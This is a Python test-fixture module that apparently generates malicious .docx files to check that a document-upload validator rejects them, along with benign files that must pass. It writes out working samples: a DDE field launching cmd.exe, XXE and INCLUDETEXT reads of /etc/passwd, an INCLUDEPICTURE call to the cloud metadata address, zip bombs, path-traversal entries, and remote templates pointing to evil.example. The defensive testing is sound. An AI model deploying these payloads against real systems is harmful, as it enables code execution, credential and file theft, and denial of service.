"""Hostile .docx files built from a real template, one attack each.

    attacks(base_docx_bytes) -> {name: (bytes, filename, expected_message_fragment)}

Every attack keeps the rest of the package valid, so only the injected part can be the reason it is rejected.
"""
import io
import struct
import zipfile
import zlib

W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


def _rebuild(base: bytes, replace=None, add=None, drop=(), duplicate=None) -> bytes:
    replace, add = replace or {}, add or {}
    src = zipfile.ZipFile(io.BytesIO(base))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for info in src.infolist():
            if info.filename in drop:
                continue
            data = replace.get(info.filename, src.read(info.filename))
            z.writestr(info.filename, data)
        for name, data in add.items():
            z.writestr(name, data)
        if duplicate:
            import warnings
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                z.writestr(duplicate[0], duplicate[1])      # second entry with the same name
    return out.getvalue()


def _doc(base: bytes) -> str:
    return zipfile.ZipFile(io.BytesIO(base)).read("word/document.xml").decode("utf-8")


def _with_body(base: bytes, inner: str) -> bytes:
    xml = _doc(base)
    i = xml.index("<w:body>") + len("<w:body>")
    return _rebuild(base, replace={"word/document.xml": (xml[:i] + inner + xml[i:]).encode()})


def _add_rel(base: bytes, rel_xml: str, part: str = "word/_rels/document.xml.rels") -> bytes:
    rels = zipfile.ZipFile(io.BytesIO(base)).read(part).decode()
    return _rebuild(base, replace={part: rels.replace("</Relationships>", rel_xml + "</Relationships>").encode()})


def _ole() -> bytes:
    """Start of an OLE2 compound file: what Word writes for a password-protected .docx."""
    return bytes.fromhex("D0CF11E0A1B11AE1") + b"\x00" * 504


def _zip_with_encrypted_flag(base: bytes) -> bytes:
    """Set the 'encrypted' general-purpose flag on the first local and central header."""
    data = bytearray(base)
    lh = data.find(b"PK\x03\x04")
    data[lh + 6] |= 0x01
    ch = data.find(b"PK\x01\x02")
    data[ch + 8] |= 0x01
    return bytes(data)


def _lying_sizes(base: bytes) -> bytes:
    """A 50 MB part whose headers claim it is 1 KB (central-directory size lie)."""
    big = b"<a>" + b"0" * (50 * 1024 * 1024) + b"</a>"
    raw = _rebuild(base, add={"word/glossary/big.xml": big})
    data = bytearray(raw)
    name = b"word/glossary/big.xml"
    for sig, size_off in ((b"PK\x03\x04", 22), (b"PK\x01\x02", 24)):
        pos = 0
        while True:
            pos = data.find(sig, pos)
            if pos < 0:
                break
            name_off = 30 if sig == b"PK\x03\x04" else 46
            n = struct.unpack("<H", data[pos + (26 if sig == b"PK\x03\x04" else 28):pos + (28 if sig == b"PK\x03\x04" else 30)])[0]
            if data[pos + name_off:pos + name_off + n] == name:
                data[pos + size_off:pos + size_off + 4] = struct.pack("<I", 1024)
            pos += 4
    return bytes(data)


def attacks(base: bytes):
    dde_split = (f'<w:p {W}><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
                 '<w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r>'
                 '<w:r><w:instrText xml:space="preserve">EAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r>'
                 '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    include_pic = (f'<w:p {W}><w:fldSimple w:instr=\' INCLUDEPICTURE "http://169.254.169.254/latest/meta-data" \\d \'>'
                   '<w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>')
    include_text = (f'<w:p {W}><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDETEXT '
                    '"file:///etc/passwd"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    xxe = ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE w [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
           + _doc(base).split("?>", 1)[1])
    laughs = ('<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">'
              '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]>' + _doc(base).split("?>", 1)[1])
    xxe16 = xxe.replace('encoding="UTF-8"', 'encoding="UTF-16"').encode("utf-16")
    bomb = b"<a>" + b"0" * (60 * 1024 * 1024) + b"</a>"
    return {
        "wrong_extension": (base, "template.docm", "Only .docx"),
        "doc_binary": (b"\xd0\xcf\x11\xe0" + b"\x00" * 100, "old.docx", "password-protected or an old"),
        "password_protected": (_ole(), "locked.docx", "password-protected or an old"),
        "oversized": (b"PK\x03\x04" + b"\x00" * (21 * 1024 * 1024), "big.docx", "larger than"),
        "zip_bomb": (_rebuild(base, add={"word/bomb.xml": bomb}), "bomb.docx", "bomb"),
        "size_lie": (_lying_sizes(base), "lie.docx", "bomb"),
        "too_many_entries": (_rebuild(base, add={f"word/media/x{i}.png": b"x" for i in range(3100)}), "many.docx", "too many"),
        "encrypted_entry": (_zip_with_encrypted_flag(base), "enc.docx", "password"),
        "duplicate_entry": (_rebuild(base, duplicate=("word/document.xml", _doc(base).encode())), "dup.docx", "twice"),
        "macro_vba": (_rebuild(base, add={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0vba"}), "m.docx", "Macro"),
        "macro_content_type": (_rebuild(base, replace={"[Content_Types].xml": zipfile.ZipFile(io.BytesIO(base)).read("[Content_Types].xml").replace(
            b"wordprocessingml.document.main+xml", b"ms-word.document.macroEnabled.main+xml")}), "m.docx", "Macro"),
        "activex": (_rebuild(base, add={"word/activeX/activeX1.xml": b"<ax/>", "word/activeX/activeX1.bin": b"x"}), "ax.docx", "ActiveX"),
        "ole_embedding": (_rebuild(base, add={"word/embeddings/oleObject1.bin": _ole()}), "ole.docx", "embedded"),
        "xxe": (_rebuild(base, replace={"word/document.xml": xxe.encode()}), "xxe.docx", "DOCTYPE"),
        "billion_laughs": (_rebuild(base, replace={"word/document.xml": laughs.encode()}), "bl.docx", "DOCTYPE"),
        "xxe_utf16": (_rebuild(base, replace={"word/document.xml": xxe16}), "x16.docx", "DOCTYPE"),
        "xxe_hidden_part": (_rebuild(base, add={"word/custom.bin": b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY y SYSTEM "http://evil/">]><x/>'}),
                            "hid.docx", "DOCTYPE"),
        "traversal_dotdot": (_rebuild(base, add={"../../evil.xml": b"<x/>"}), "t.docx", "unsafe"),
        "traversal_absolute": (_rebuild(base, add={"/etc/evil.xml": b"<x/>"}), "t.docx", "unsafe"),
        "traversal_drive": (_rebuild(base, add={"C:/evil.xml": b"<x/>"}), "t.docx", "unsafe"),
        "traversal_backslash": (_rebuild(base, add={"word\\..\\..\\evil.xml": b"<x/>"}), "t.docx", "unsafe"),
        "remote_template": (_add_rel(base, f'<Relationship Id="rIdT" Type="{REL}/attachedTemplate" '
                                           'Target="https://evil.example/t.dotm" TargetMode="External"/>',
                                     "word/_rels/document.xml.rels"), "rt.docx", "remote"),
        "remote_template_single_quotes": (_add_rel(base, f"<Relationship Id='rIdT' TargetMode='External' "
                                                         f"Type='{REL}/attachedTemplate' Target='\\\\evil\\share\\t.dotm'/>"),
                                          "rt.docx", "remote"),
        "remote_image": (_add_rel(base, f'<Relationship Id="rIdI" Type="{REL}/image" '
                                        'Target="http://evil.example/track.png" TargetMode="External"/>'), "ri.docx", "remote"),
        "remote_frame": (_add_rel(base, f'<Relationship Id="rIdF" Type="{REL}/frame" '
                                        'Target="http://evil.example/f.html" TargetMode="External"/>'), "rf.docx", "remote"),
        "dde_split_field": (_with_body(base, dde_split), "dde.docx", "field"),
        "includepicture_field": (_with_body(base, include_pic), "ip.docx", "field"),
        "includetext_field": (_with_body(base, include_text), "it.docx", "field"),
    }


def allowed(base: bytes):
    """Things a normal template has that must NOT be rejected."""
    return {
        "plain": base,
        "external_hyperlink": _add_rel(base, f'<Relationship Id="rIdH" Type="{REL}/hyperlink" '
                                             'Target="https://example.org" TargetMode="External"/>'),
        "page_field": _with_body(base, f'<w:p {W}><w:fldSimple w:instr=" PAGE "><w:r><w:t>1</w:t></w:r></w:fldSimple></w:p>'),
        "hyperlink_field": _with_body(base, f'<w:p {W}><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>'
                                            'HYPERLINK "https://example.org"</w:instrText></w:r>'
                                            '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'),
        "chart_workbook": _rebuild(base, add={"word/embeddings/Microsoft_Excel_Worksheet.xlsx": b"PK\x03\x04xlsx"}),
        "compressed_media": _rebuild(base, add={"word/media/blank.png": zlib.compress(b"\x00" * 2000)}),
    }
